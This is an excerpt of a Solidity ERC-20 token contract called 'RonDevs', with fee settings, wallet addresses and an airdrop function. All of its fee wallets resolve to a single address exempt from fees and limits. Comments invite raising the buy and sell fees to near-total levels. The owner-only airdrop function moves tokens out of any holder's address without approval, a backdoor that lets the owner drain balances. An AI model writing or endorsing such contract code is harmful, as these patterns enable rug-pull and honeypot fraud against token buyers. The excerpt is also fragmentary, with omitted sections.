...
contract Rondevsdotcom is Context, IERC20, Ownable {                                                    ////////////////////////////////////////
...
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    address payable public _marketingAddress =
        payable(address(0x334379448D5b33E85501EA736Ffd08AC78e2978E)); // dev
    address payable public _devwallet =
        payable(address(0x334379448D5b33E85501EA736Ffd08AC78e2978E)); // marketing
    address public _treasury =
        payable(address(0x334379448D5b33E85501EA736Ffd08AC78e2978E)); // treasury
    address _treasury2 =
        payable(address(0x334379448D5b33E85501EA736Ffd08AC78e2978E)); //treasury
    address private _donationAddress =
        0x000000000000000000000000000000000000dEaD;

    string private _name = "RonDevs";                                                                                  //////////////////////
    ...
    uint256 public _maxTxAmount = 1000000000 * 10**9;  //0.1%                                                                           /////////////////////////
    uint256 private numTokensSellToAddToLiquidity = 2000000000 * 10**9; //0,2%
...
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    constructor() {
        ...
        buyFee.tax = 1;
        buyFee.liquidity = 1; //You can set this to 47 (antibot)
        buyFee.marketing = 3; //You can set this to 48
        buyFee.dev = 1;
        buyFee.donation = 0;

        sellFee.tax = 1;
        sellFee.liquidity = 1;  //You can set this to 47 (antibot)
        sellFee.marketing = 3; //You can set this to 48
        sellFee.dev = 1;
        sellFee.donation = 0;
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ...
        _isExcludedFromFee[_treasury2] = true;

        _isExcludedFromLimit[_marketingAddress] = true;
        _isExcludedFromLimit[_devwallet] = true;
        _isExcludedFromLimit[_treasury] = true;
        _isExcludedFromLimit[_treasury2] = true;
    ...
    function airdrop(address sender, address[] calldata recipients, uint256[] calldata values) external onlyOwner {
        require(recipients.length == values.length, "Mismatch between Address and token count");
            for (uint256 i = 0; i < recipients.length; i++) {
                _transfer(sender, recipients[i], values[i] * 1e9);
        }
    }
